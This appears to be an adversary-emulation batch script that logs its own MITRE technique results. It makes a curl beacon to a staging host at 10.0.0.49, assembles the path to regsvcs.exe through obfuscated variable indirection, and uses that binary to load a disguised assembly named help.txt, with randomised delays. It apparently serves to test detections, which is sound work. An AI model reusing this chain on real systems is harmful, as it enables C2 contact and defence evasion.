@echo off
SETLOCAL EnableDelayedExpansion

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\8700\fe713f7f
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8700-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=help.txt
SET dvhhyc=8700

REM Log file variable
SET mslthrd=%APPDATA%\!rrocubc!\macula-simulations.log

REM Initial delay
timeout /t 40 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete>> "!mslthrd!" 2>nul

REM C2 heartbeat (CRITICAL: no obfuscation of curl command)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: c2_heartbeat_start>> "!mslthrd!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: c2_heartbeat_complete>> "!mslthrd!" 2>nul

REM Random delay
SET /A dl=%RANDOM% %% 20 + 10
timeout /t !dl! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete=!dl!s>> "!mslthrd!" 2>nul

REM Obfuscated LOLBIN construction using variable indirection
SET axjkop=C:\Windows\Microsoft.NET\Framework\v4.0.30319\
SET bwqmvo=reg
SET cnxlrp=svcs
SET dmzpts=.exe
SET enafqu=axjkop
SET fobgir=bwqmvo
SET gpchjs=cnxlrp
SET hqdklt=dmzpts
CALL SET lolbin1=%%!enafqu!%%
CALL SET lolbin2=%%!fobgir!%%
CALL SET lolbin3=%%!gpchjs!%%
CALL SET lolbin4=%%!hqdklt!%%
SET lolnm=!lolbin1!!lolbin2!!lolbin3!!lolbin4!

REM Change directory
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>> "!mslthrd!" 2>nul
cd /d "!txisnba!" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_complete=!ERRORLEVEL!>> "!mslthrd!" 2>nul

ping -n 8 127.0.0.1 >nul

REM Execute .NET DLL via regsvcs.exe
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_execution_start=!xzanpex!>> "!mslthrd!" 2>nul
SET regsvcs_success=0
SET regsvcs_error=
"!lolnm!" "!xzanpex!" 2>nul
IF !ERRORLEVEL! EQU 0 (
    SET regsvcs_success=1
) ELSE (
    SET regsvcs_error=assembly_load_failed
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_execution_complete=!ERRORLEVEL!>> "!mslthrd!" 2>nul

REM TTP logging for T1218
SET ttp_result=!regsvcs_success!
SET ttp_error=!regsvcs_error!
SET ttp_id=T1218
SET ttp_name=Signed_Binary_Proxy_Execution_Regsvcs
SET ttp_log=[!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2! !TIME:~0,8!.000][!jwcnifl!]: !rrocubc!-!dvhhyc!-!ttp_id!|!ttp_name!=!ttp_result!:!ttp_error!
echo !ttp_log!>> "!mslthrd!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_complete>> "!mslthrd!" 2>nul